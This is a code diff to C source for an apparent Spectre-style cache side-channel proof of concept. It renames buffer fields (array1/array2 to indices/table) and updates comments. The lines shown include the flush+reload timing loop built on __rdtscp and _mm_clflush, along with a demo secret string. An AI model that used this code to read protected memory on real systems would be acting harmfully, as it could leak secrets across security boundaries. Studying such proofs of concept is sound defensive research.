@@ -22,8 +22,8 @@ typedef struct {
 char *secret = "The Magic Words are Squeamish Ossifrage.";
 
 memory_buffer_t buffer = {
-    .array1_size = 16,
-    .array1 = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
+    .indices_size = 16,
+    .indices = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
 };
 
 static void print_dump(const unsigned char *p, size_t size) {
@@ -101,7 +101,7 @@ static void read_byte(size_t address, result_t *result, int tries, size_t thresh
         for (int i = 0; i < 256; i++) {
             register uint64_t time1, time2;
             int mix_i = ((i * 167) + 13) & 255;
-            addr = buffer.array2 + mix_i * CACHE_PAGE;
+            addr = buffer.table + mix_i * CACHE_PAGE;
             time1 = __rdtscp(&junk);
             junk = *addr;
             time2 = __rdtscp(&junk) - time1;
@@ -193,15 +193,15 @@ int execute(void *addres, size_t len, int tries, exploit_handler exploit) {
         return 1;
     }
     
-    // Write data to array2 to ensure it is memory backed
-    memset(buffer.array2, 1, sizeof(buffer.array2));
+    // Write data to table array to ensure it is memory backed
+    memset(buffer.table, 1, sizeof(buffer.table));
     
     size_t threshold = detect_flush_reload_threshold();
     size_t x = (size_t)addres;
     
-    // Flush array2[256 * (0..255)] from cache
+    // Flush table[256 * (0..255)] from cache
     for (int i = 0; i < 256; i++) {
-        _mm_clflush(buffer.array2 + i * CACHE_PAGE);
+        _mm_clflush(buffer.table + i * CACHE_PAGE);
     }
     
     printf("Reading %zd bytes in %d tries:\n", len, tries);
